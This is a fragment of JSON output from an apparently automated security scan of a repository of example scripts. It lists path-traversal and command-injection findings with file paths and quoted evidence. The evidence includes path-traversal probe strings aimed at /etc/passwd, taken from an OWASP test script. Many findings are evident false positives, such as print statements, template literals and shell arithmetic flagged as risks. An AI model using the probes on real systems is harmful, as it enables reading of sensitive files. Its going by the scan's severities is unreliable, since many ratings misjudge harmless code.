        "category": "Path Traversal Risk",
        "file": "skills/protocols/protobuf-schemas/resources/scripts/validate_proto_schemas.py",
        "line_number": 666,
        "issue": "Path traversal pattern",
        "evidence": "suggestion=f\"Add 'option {option} = \\\"...\\\";'\"",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/protocols/grpc-implementation/resources/examples/python/server.py",
        "line_number": 23,
        "issue": "Path traversal pattern",
        "evidence": "# python -m grpc_tools.protoc -I../protos --python_out=. --grpc_python_out=. ../protos/service.proto",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/protocols/grpc-implementation/resources/examples/python/client.py",
        "line_number": 17,
        "issue": "Path traversal pattern",
        "evidence": "# python -m grpc_tools.protoc -I../protos --python_out=. --grpc_python_out=. ../protos/service.proto",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/cryptography/signing-verification/resources/examples/hsm-pkcs11-signing.py",
        "line_number": 69,
        "issue": "User-controlled file path",
        "evidence": "self.session = self.token.open(user_pin=pin)",
        "recommendation": "Validate path is within allowed directory"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/cryptography/signing-verification/resources/scripts/sign_artifacts.py",
        "line_number": 141,
        "issue": "User-controlled file path",
        "evidence": "self.pkcs11_session = slot.open(user_pin=self.hsm_pin)",
        "recommendation": "Validate path is within allowed directory"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/cryptography/signing-verification/resources/scripts/audit_signing_keys.py",
        "line_number": 629,
        "issue": "User-controlled file path",
        "evidence": "session = slot.open(user_pin=pin)",
        "recommendation": "Validate path is within allowed directory"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/security/vulnerability-assessment/resources/scripts/test_owasp_top10.py",
        "line_number": 78,
        "issue": "Path traversal pattern",
        "evidence": "\"../../../etc/passwd\",",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/security/vulnerability-assessment/resources/scripts/test_owasp_top10.py",
        "line_number": 80,
        "issue": "Path traversal pattern",
        "evidence": "\"....//....//....//etc/passwd\"",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/typed-holes-refactor/scripts/check_production.py",
        "line_number": 26,
        "issue": "Path traversal pattern",
        "evidence": "print(\"\ud83d\ude80 Checking Production Readiness (Gate 4)...\\n\")",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/typed-holes-refactor/scripts/check_foundation.py",
        "line_number": 26,
        "issue": "Path traversal pattern",
        "evidence": "print(\"\ud83c\udfd7\ufe0f  Checking Foundation Phase (Gate 2)...\\n\")",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/typed-holes-refactor/scripts/holes_to_beads.py",
        "line_number": 94,
        "issue": "Path traversal pattern",
        "evidence": "print(\"\ud83d\udd04 Syncing holes to beads...\\n\")",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/typed-holes-refactor/scripts/check_discovery.py",
        "line_number": 25,
        "issue": "Path traversal pattern",
        "evidence": "print(\"\ud83d\udd0d Checking Discovery Phase (Gate 1)...\\n\")",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/typed-holes-refactor/scripts/check_implementation.py",
        "line_number": 26,
        "issue": "Path traversal pattern",
        "evidence": "print(\"\u2699\ufe0f  Checking Implementation Phase (Gate 3)...\\n\")",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/database/redis-data-structures/resources/scripts/benchmark_operations.py",
        "line_number": 464,
        "issue": "Path traversal pattern",
        "evidence": "print(f\"Running benchmarks with {args.iterations} iterations...\\n\", file=sys.stderr)",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/distributed-systems/event-sourcing/resources/examples/python/bank_account_aggregate.py",
        "line_number": 99,
        "issue": "User-controlled file path",
        "evidence": "def open(cls, account_id: str, owner: str, initial_deposit: Decimal, user_id: str) -> 'BankAccount':",
        "recommendation": "Validate path is within allowed directory"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/testing/integration-testing/resources/scripts/run_integration_tests.sh",
        "line_number": 11,
        "issue": "Path traversal pattern",
        "evidence": "DOCKER_COMPOSE_FILE=\"${SCRIPT_DIR}/../examples/docker/docker-compose-test.yml\"",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/protocols/protobuf-schemas/resources/examples/generate_code_python.sh",
        "line_number": 29,
        "issue": "Path traversal pattern",
        "evidence": "#   ../scripts/generate_proto_code.py --proto-file user_service.proto --language python",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/protocols/protobuf-schemas/resources/examples/generate_code_python.sh",
        "line_number": 47,
        "issue": "Path traversal pattern",
        "evidence": "\"${SCRIPT_DIR}/../scripts/generate_proto_code.py\" \\",
        "recommendation": "Validate and sanitize file paths"
      },
      {
        "severity": "MEDIUM",
        "category": "Path Traversal Risk",
        "file": "skills/protocols/protobuf-schemas/resources/examples/generate_code_go.sh",
        "line_number": 49,
        "issue": "Path traversal pattern",
        "evidence": "\"${SCRIPT_DIR}/../scripts/generate_proto_code.py\" \\",
        "recommendation": "Validate and sanitize file paths"
      }
    ],
    "Command Injection Risk": [
      {
        "severity": "CRITICAL",
        "category": "Command Injection Risk",
        "file": "skills/api/api-rate-limiting/resources/examples/python/fastapi-limiter.py",
        "line_number": 126,
        "issue": "eval() usage",
        "evidence": "result = await redis_client.eval(",
        "recommendation": "Never use eval() with user input"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/api/rest-api-design/resources/scripts/generate_openapi.py",
        "line_number": 449,
        "issue": "Backtick command execution",
        "evidence": "const url = `${this.baseUrl}${path}`;",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/api/rest-api-design/resources/scripts/generate_openapi.py",
        "line_number": 453,
        "issue": "Backtick command execution",
        "evidence": "headers['Authorization'] = `Bearer ${this.apiKey}`;",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/api/rest-api-design/resources/scripts/generate_openapi.py",
        "line_number": 467,
        "issue": "Backtick command execution",
        "evidence": "throw new Error(`HTTP ${response.status}: ${response.statusText}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/api/rest-api-design/resources/scripts/generate_openapi.py",
        "line_number": 526,
        "issue": "Backtick command execution",
        "evidence": "code += '    if (params.toString()) path += `?${params.toString()}`;\\n'",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "HIGH",
        "category": "Command Injection Risk",
        "file": "skills/cryptography/certificate-management/resources/examples/python/mtls_server_client.py",
        "line_number": 173,
        "issue": "shell=True in subprocess",
        "evidence": "# SECURITY: Commands are hardcoded strings (no user input) - safe to use shell=True",
        "recommendation": "Use shell=False and pass command as list"
      },
      {
        "severity": "HIGH",
        "category": "Command Injection Risk",
        "file": "skills/cryptography/certificate-management/resources/examples/python/mtls_server_client.py",
        "line_number": 175,
        "issue": "shell=True in subprocess",
        "evidence": "subprocess.run(cmd, shell=True, check=True)",
        "recommendation": "Use shell=False and pass command as list"
      },
      {
        "severity": "HIGH",
        "category": "Command Injection Risk",
        "file": "skills/cryptography/certificate-management/resources/scripts/renew_certificates.py",
        "line_number": 333,
        "issue": "shell=True in subprocess",
        "evidence": "shell=True,",
        "recommendation": "Use shell=False and pass command as list"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/engineering/incident-response/resources/examples/integrations/slack-incident-bot.py",
        "line_number": 151,
        "issue": "Backtick command execution",
        "evidence": "\"text\": \":information_source: Use this channel for incident coordination only. Post updates in format: `[HH:MM] [@person] [ACTION/DECISION/OBSERVATION] Description`\"",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "CRITICAL",
        "category": "Command Injection Risk",
        "file": "skills/engineering/code-review/resources/examples/python/automated_review_checks.py",
        "line_number": 287,
        "issue": "eval() usage",
        "evidence": "message=\"Use of 'eval()' is a security risk. \"",
        "recommendation": "Never use eval() with user input"
      },
      {
        "severity": "HIGH",
        "category": "Command Injection Risk",
        "file": "skills/engineering/code-review/resources/examples/python/automated_review_checks.py",
        "line_number": 297,
        "issue": "exec() usage",
        "evidence": "message=\"Use of 'exec()' is a security risk. \"",
        "recommendation": "Avoid exec() or strictly validate input"
      },
      {
        "severity": "HIGH",
        "category": "Command Injection Risk",
        "file": "skills/engineering/code-review/resources/examples/python/automated_review_checks.py",
        "line_number": 312,
        "issue": "shell=True in subprocess",
        "evidence": "# Check for shell=True in subprocess",
        "recommendation": "Use shell=False and pass command as list"
      },
      {
        "severity": "HIGH",
        "category": "Command Injection Risk",
        "file": "skills/engineering/code-review/resources/examples/python/automated_review_checks.py",
        "line_number": 319,
        "issue": "shell=True in subprocess",
        "evidence": "message=\"subprocess with shell=True is vulnerable to injection. \"",
        "recommendation": "Use shell=False and pass command as list"
      },
      {
        "severity": "HIGH",
        "category": "Command Injection Risk",
        "file": "skills/engineering/code-review/resources/scripts/review_pr.py",
        "line_number": 292,
        "issue": "shell=True in subprocess",
        "evidence": "shell=True,",
        "recommendation": "Use shell=False and pass command as list"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/typed-holes-refactor/scripts/discover_holes.py",
        "line_number": 249,
        "issue": "Backtick command execution",
        "evidence": "3. Write characterization tests (see `tests/characterization/`)",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/typed-holes-refactor/scripts/discover_holes.py",
        "line_number": 251,
        "issue": "Backtick command execution",
        "evidence": "5. Run `python scripts/next_hole.py` to see next resolvable holes",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/typed-holes-refactor/scripts/discover_holes.py",
        "line_number": 311,
        "issue": "Backtick command execution",
        "evidence": "print(\"\ud83c\udfaf Then: Run `python scripts/next_hole.py` to start resolution\")",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/typed-holes-refactor/scripts/generate_report.py",
        "line_number": 147,
        "issue": "Backtick command execution",
        "evidence": "Run `radon cc -a src/` and `pytest --cov` for detailed metrics.",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/typed-holes-refactor/scripts/generate_report.py",
        "line_number": 199,
        "issue": "Backtick command execution",
        "evidence": "Run `pytest --cov=src --cov-report=html` for detailed coverage report.",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/api/rest-api-design/resources/scripts/test_api.sh",
        "line_number": 147,
        "issue": "Command substitution in shell",
        "evidence": "TOTAL_TESTS=$((TOTAL_TESTS + 1))",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/api/rest-api-design/resources/scripts/test_api.sh",
        "line_number": 150,
        "issue": "Command substitution in shell",
        "evidence": "PASSED_TESTS=$((PASSED_TESTS + 1))",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/api/rest-api-design/resources/scripts/test_api.sh",
        "line_number": 153,
        "issue": "Command substitution in shell",
        "evidence": "FAILED_TESTS=$((FAILED_TESTS + 1))",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/api/rest-api-design/resources/scripts/test_api.sh",
        "line_number": 192,
        "issue": "Command substitution in shell",
        "evidence": "response=$(eval curl $curl_opts \"$url\" 2>&1)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/api/rest-api-design/resources/scripts/test_api.sh",
        "line_number": 197,
        "issue": "Command substitution in shell",
        "evidence": "body=$(echo \"$response\" | head -n -1)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/api/rest-api-design/resources/scripts/test_api.sh",
        "line_number": 198,
        "issue": "Command substitution in shell",
        "evidence": "status_code=$(echo \"$response\" | tail -n 1)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/api/rest-api-design/resources/scripts/test_api.sh",
        "line_number": 227,
        "issue": "Command substitution in shell",
        "evidence": "if response=$(make_request GET /health \"\" \"\" 200 2>&1); then",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/api/rest-api-design/resources/scripts/test_api.sh",
        "line_number": 239,
        "issue": "Command substitution in shell",
        "evidence": "if response=$(make_request GET /api/users \"\" \"\" 200 2>&1); then",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/api/rest-api-design/resources/scripts/test_api.sh",
        "line_number": 261,
        "issue": "Command substitution in shell",
        "evidence": "if response=$(make_request GET /api/users/1 \"\" \"\" 200 2>&1); then",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/api/rest-api-design/resources/scripts/test_api.sh",
        "line_number": 285,
        "issue": "Command substitution in shell",
        "evidence": "if response=$(make_request POST /api/users \"$data\" \"\" 201 2>&1); then",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/api/rest-api-design/resources/scripts/test_api.sh",
        "line_number": 291,
        "issue": "Command substitution in shell",
        "evidence": "CREATED_RESOURCE_ID=$(echo \"$response\" | jq -r '.id')",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/api/rest-api-design/resources/scripts/test_api.sh",
        "line_number": 314,
        "issue": "Command substitution in shell",
        "evidence": "if response=$(make_request PUT /api/users/$resource_id \"$data\" \"\" 200 2>&1); then",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/api/rest-api-design/resources/scripts/test_api.sh",
        "line_number": 329,
        "issue": "Command substitution in shell",
        "evidence": "if response=$(make_request PATCH /api/users/$resource_id \"$data\" \"\" 200 2>&1); then",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/api/rest-api-design/resources/scripts/test_api.sh",
        "line_number": 344,
        "issue": "Command substitution in shell",
        "evidence": "if response=$(make_request DELETE /api/users/$resource_id \"\" \"\" 204 2>&1); then",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/api/rest-api-design/resources/scripts/test_api.sh",
        "line_number": 346,
        "issue": "Command substitution in shell",
        "evidence": "elif response=$(make_request DELETE /api/users/$resource_id \"\" \"\" 200 2>&1); then",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/api/rest-api-design/resources/scripts/test_api.sh",
        "line_number": 359,
        "issue": "Command substitution in shell",
        "evidence": "if response=$(make_request GET /api/users/999999 \"\" \"\" 404 2>&1); then",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/api/rest-api-design/resources/scripts/test_api.sh",
        "line_number": 379,
        "issue": "Command substitution in shell",
        "evidence": "if response=$(make_request POST /api/users \"$data\" \"\" 400 2>&1); then",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/api/rest-api-design/resources/scripts/test_api.sh",
        "line_number": 381,
        "issue": "Command substitution in shell",
        "evidence": "elif response=$(make_request POST /api/users \"$data\" \"\" 422 2>&1); then",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/api/rest-api-design/resources/scripts/test_api.sh",
        "line_number": 394,
        "issue": "Command substitution in shell",
        "evidence": "if response=$(make_request GET \"/api/users?limit=10&offset=0\" \"\" \"\" 200 2>&1); then",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/api/rest-api-design/resources/scripts/test_api.sh",
        "line_number": 412,
        "issue": "Command substitution in shell",
        "evidence": "if response=$(make_request GET \"/api/users?status=active\" \"\" \"\" 200 2>&1); then",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/api/rest-api-design/resources/scripts/test_api.sh",
        "line_number": 424,
        "issue": "Command substitution in shell",
        "evidence": "if response=$(make_request GET \"/api/users?sort=created_at\" \"\" \"\" 200 2>&1); then",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/api/rest-api-design/resources/scripts/test_api.sh",
        "line_number": 436,
        "issue": "Command substitution in shell",
        "evidence": "if response=$(make_request GET /api/users \"\" \"-H 'Accept: application/json'\" 200 2>&1); then",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/api/rest-api-design/resources/scripts/test_api.sh",
        "line_number": 455,
        "issue": "Command substitution in shell",
        "evidence": "if ! response=$(make_request GET /api/users \"\" \"\" 200 2>&1); then",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/api/rest-api-design/resources/scripts/test_api.sh",
        "line_number": 461,
        "issue": "Command substitution in shell",
        "evidence": "count=$((count + 1))",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/api/rest-api-design/resources/scripts/test_api.sh",
        "line_number": 478,
        "issue": "Command substitution in shell",
        "evidence": "response1=$(curl -s -I \"${BASE_URL}/api/users\" 2>&1)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/api/rest-api-design/resources/scripts/test_api.sh",
        "line_number": 495,
        "issue": "Command substitution in shell",
        "evidence": "if ! response=$(make_request GET /api/users \"\" \"\" 401 2>&1); then",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/api/rest-api-design/resources/scripts/test_api.sh",
        "line_number": 509,
        "issue": "Command substitution in shell",
        "evidence": "response=$(curl -s -I -X OPTIONS \"${BASE_URL}/api/users\" 2>&1)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cloud/aws-lambda-deployment/resources/scripts/test_function.sh",
        "line_number": 150,
        "issue": "Command substitution in shell",
        "evidence": "local start_time=$(date +%s.%N)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cloud/aws-lambda-deployment/resources/scripts/test_function.sh",
        "line_number": 154,
        "issue": "Command substitution in shell",
        "evidence": "invoke_output=$(eval \"$aws_cmd\" 2>&1)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cloud/aws-lambda-deployment/resources/scripts/test_function.sh",
        "line_number": 157,
        "issue": "Command substitution in shell",
        "evidence": "local end_time=$(date +%s.%N)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cloud/aws-lambda-deployment/resources/scripts/test_function.sh",
        "line_number": 158,
        "issue": "Command substitution in shell",
        "evidence": "local duration=$(echo \"$end_time - $start_time\" | bc)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cloud/aws-lambda-deployment/resources/scripts/test_function.sh",
        "line_number": 166,
        "issue": "Command substitution in shell",
        "evidence": "local status_code=$(echo \"$invoke_output\" | jq -r '.StatusCode // empty')",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cloud/aws-lambda-deployment/resources/scripts/test_function.sh",
        "line_number": 167,
        "issue": "Command substitution in shell",
        "evidence": "local function_error=$(echo \"$invoke_output\" | jq -r '.FunctionError // empty')",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cloud/aws-lambda-deployment/resources/scripts/test_function.sh",
        "line_number": 168,
        "issue": "Command substitution in shell",
        "evidence": "local log_result=$(echo \"$invoke_output\" | jq -r '.LogResult // empty')",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cloud/aws-lambda-deployment/resources/scripts/test_function.sh",
        "line_number": 173,
        "issue": "Command substitution in shell",
        "evidence": "logs=$(echo \"$log_result\" | base64 --decode)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cloud/aws-lambda-deployment/resources/scripts/test_function.sh",
        "line_number": 179,
        "issue": "Command substitution in shell",
        "evidence": "response=$(cat \"$response_file\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cloud/aws-lambda-deployment/resources/scripts/test_function.sh",
        "line_number": 236,
        "issue": "Command substitution in shell",
        "evidence": "local end_time=$(($(date +%s) + duration))",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cloud/aws-lambda-deployment/resources/scripts/test_function.sh",
        "line_number": 243,
        "issue": "Command substitution in shell",
        "evidence": "local tmp_dir=$(mktemp -d)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cloud/aws-lambda-deployment/resources/scripts/test_function.sh",
        "line_number": 247,
        "issue": "Command substitution in shell",
        "evidence": "while [[ $(date +%s) -lt $end_time ]]; do",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cloud/aws-lambda-deployment/resources/scripts/test_function.sh",
        "line_number": 251,
        "issue": "Command substitution in shell",
        "evidence": "local start=$(date +%s.%N)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cloud/aws-lambda-deployment/resources/scripts/test_function.sh",
        "line_number": 273,
        "issue": "Command substitution in shell",
        "evidence": "local status_code=$(jq -r '.StatusCode // 200' \"$response_file\" 2>/dev/null || echo \"200\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cloud/aws-lambda-deployment/resources/scripts/test_function.sh",
        "line_number": 283,
        "issue": "Command substitution in shell",
        "evidence": "local end=$(date +%s.%N)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cloud/aws-lambda-deployment/resources/scripts/test_function.sh",
        "line_number": 284,
        "issue": "Command substitution in shell",
        "evidence": "echo \"duration:$(echo \"$end - $start\" | bc)\"",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cloud/aws-lambda-deployment/resources/scripts/test_function.sh",
        "line_number": 294,
        "issue": "Command substitution in shell",
        "evidence": "local batch_success=$(jobs -p | wc -l)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cloud/aws-lambda-deployment/resources/scripts/test_function.sh",
        "line_number": 295,
        "issue": "Command substitution in shell",
        "evidence": "total_requests=$((total_requests + concurrency))",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cloud/aws-lambda-deployment/resources/scripts/test_function.sh",
        "line_number": 305,
        "issue": "Command substitution in shell",
        "evidence": "successful_requests=$(grep -c \"success\" \"$tmp_dir\"/* 2>/dev/null || echo \"0\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cloud/aws-lambda-deployment/resources/scripts/test_function.sh",
        "line_number": 306,
        "issue": "Command substitution in shell",
        "evidence": "failed_requests=$((total_requests - successful_requests))",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cloud/aws-lambda-deployment/resources/scripts/test_function.sh",
        "line_number": 309,
        "issue": "Command substitution in shell",
        "evidence": "total_duration=$(awk '{sum+=$1} END {print sum}' \"$tmp_dir\"/duration_* 2>/dev/null || echo \"0\")",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cloud/aws-lambda-deployment/resources/scripts/test_function.sh",
        "line_number": 314,
        "issue": "Command substitution in shell",
        "evidence": "avg_duration=$(echo \"scale=3; $total_duration / $successful_requests\" | bc)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cloud/aws-lambda-deployment/resources/scripts/test_function.sh",
        "line_number": 319,
        "issue": "Command substitution in shell",
        "evidence": "success_rate=$(echo \"scale=2; $successful_requests * 100 / $total_requests\" | bc)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cloud/aws-lambda-deployment/resources/scripts/test_function.sh",
        "line_number": 322,
        "issue": "Command substitution in shell",
        "evidence": "local rps=$(echo \"scale=2; $total_requests / $duration\" | bc)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cloud/kubernetes-deployment/resources/scripts/test_deployment.sh",
        "line_number": 94,
        "issue": "Command substitution in shell",
        "evidence": "TESTS_RUN=$((TESTS_RUN + 1))",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cloud/kubernetes-deployment/resources/scripts/test_deployment.sh",
        "line_number": 97,
        "issue": "Command substitution in shell",
        "evidence": "TESTS_PASSED=$((TESTS_PASSED + 1))",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cloud/kubernetes-deployment/resources/scripts/test_deployment.sh",
        "line_number": 100,
        "issue": "Command substitution in shell",
        "evidence": "TESTS_FAILED=$((TESTS_FAILED + 1))",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cloud/kubernetes-deployment/resources/scripts/test_deployment.sh",
        "line_number": 250,
        "issue": "Command substitution in shell",
        "evidence": "deployments=$(kubectl get deployments -n \"$NAMESPACE\" -o jsonpath='{.items[*].metadata.name}')",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cloud/kubernetes-deployment/resources/scripts/test_deployment.sh",
        "line_number": 273,
        "issue": "Command substitution in shell",
        "evidence": "pods=$(kubectl get pods -n \"$NAMESPACE\" -o json)",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cloud/kubernetes-deployment/resources/scripts/test_deployment.sh",
        "line_number": 276,
        "issue": "Command substitution in shell",
        "evidence": "total_pods=$(echo \"$pods\" | jq -r '.items | length')",
        "recommendation": "Validate and sanitize all inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/cloud/kubernetes-deployment/resources/scripts/test_deployment.sh",
        "line_number": 286,
        "issue": "Command substitution in shell",
        "evidence": "for i in $(seq 0 $((total_pods - 1))); do",
        "recommendation": "Validate and sanitize all inputs"
